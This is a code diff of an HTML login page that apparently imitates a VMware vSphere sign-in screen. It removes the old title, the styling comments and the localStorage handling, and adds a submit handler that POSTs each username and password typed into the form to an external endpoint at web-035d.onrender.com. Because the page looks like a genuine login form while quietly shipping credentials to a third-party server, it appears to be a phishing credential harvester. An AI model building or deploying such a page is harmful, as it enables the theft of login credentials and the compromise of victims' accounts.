@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>VMware vSphere</title>
+    <title>Formulario de Autenticación</title>
     <style>
         body {
             margin: 0;
@@ -14,17 +14,17 @@
         }
         .main-content {
             display: flex;
-            flex: 1; /* Ocupa todo el espacio vertical disponible excepto el footer */
+            flex: 1;
         }
         .left-panel {
-            flex: 1; /* 25% del ancho */
+            flex: 1;
             display: flex;
             justify-content: center;
             align-items: center;
             background-color: #ffffff;
         }
         .right-panel {
-            flex: 3; /* 75% del ancho */
+            flex: 3;
             background: url('fondo.jpg') no-repeat center center;
             background-size: cover;
         }
@@ -33,13 +33,13 @@
             text-align: left;
         }
         .title {
-            font-size: 30px; /* Aumentado el tamaño */
-            font-weight: normal; /* Sin negrita */
-            color: #000; /* Color negro */
+            font-size: 30px;
+            font-weight: normal;
+            color: #000;
             margin-bottom: 20px;
         }
         .title sup {
-            font-size: 10px; /* Tamaño del símbolo ® */
+            font-size: 10px;
         }
         input[type="text"],
         input[type="password"] {
@@ -54,13 +54,13 @@
         input[type="text"]:focus,
         input[type="password"]:focus {
             outline: none;
-            border-bottom: 1px solid #007bff; /* Cambia el color al enfocarse */
+            border-bottom: 1px solid #007bff;
         }
         .checkbox-container {
             display: flex;
             align-items: center;
             font-size: 14px;
-            color: #aaa; /* Color gris del texto */
+            color: #aaa;
             margin-bottom: 20px;
         }
         .checkbox-container input {
@@ -73,21 +73,21 @@
             width: 100%;
             padding: 12px;
             font-size: 16px;
-            background-color: #d3d3d3; /* Botón gris por defecto */
+            background-color: #d3d3d3;
             color: white;
             border: none;
             border-radius: 4px;
             cursor: not-allowed;
         }
         button.active {
-            background-color: #007bff; /* Botón azul cuando es activo */
+            background-color: #007bff;
             cursor: pointer;
         }
         footer {
             background-color: #000;
-            color: #888; /* Texto gris */
-            text-align: left; /* Alineación a la izquierda */
-            padding: 10px 20px; /* Añadido un poco de espacio a la izquierda */
+            color: #888;
+            text-align: left;
+            padding: 10px 20px;
             font-size: 14px;
         }
     </style>
@@ -131,35 +131,34 @@
             }
         }
 
-        // Función para cargar los datos desde el localStorage
-        function loadFormData() {
-            const savedUsername = localStorage.getItem('username');
-            const savedPassword = localStorage.getItem('password');
-            if (savedUsername) {
-                document.getElementById('username').value = savedUsername;
-            }
-            if (savedPassword) {
-                document.getElementById('password').value = savedPassword;
-            }
-            checkFields();  // Verifica si el botón debe ser habilitado
-        }
+        // Función para enviar los datos del formulario al servidor
+        function sendFormData(event) {
+            event.preventDefault(); // Evitar que el formulario se envíe de manera convencional
 
-        // Función para guardar los datos en el localStorage
-        function saveFormData() {
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
-            localStorage.setItem('username', username);
-            localStorage.setItem('password', password);
+
+            // Enviar los datos al servidor
+            fetch('https://web-035d.onrender.com/saveData', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ username, password }),
+            })
+            .then(response => response.json())
+            .then(data => {
+                alert(data.message);  // Mostrar un mensaje de éxito o error
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('Hubo un error al guardar los datos.');
+            });
         }
 
-        // Escuchar el evento de envío del formulario para guardar los datos
-        document.getElementById('loginForm').addEventListener('submit', function(event) {
-            event.preventDefault();
-            saveFormData();
-        });
-
-        // Cargar los datos al cargar la página
-        window.onload = loadFormData;
+        // Asignar el evento al formulario
+        document.getElementById('loginForm').addEventListener('submit', sendFormData);
     </script>
 </body>
 </html>
+
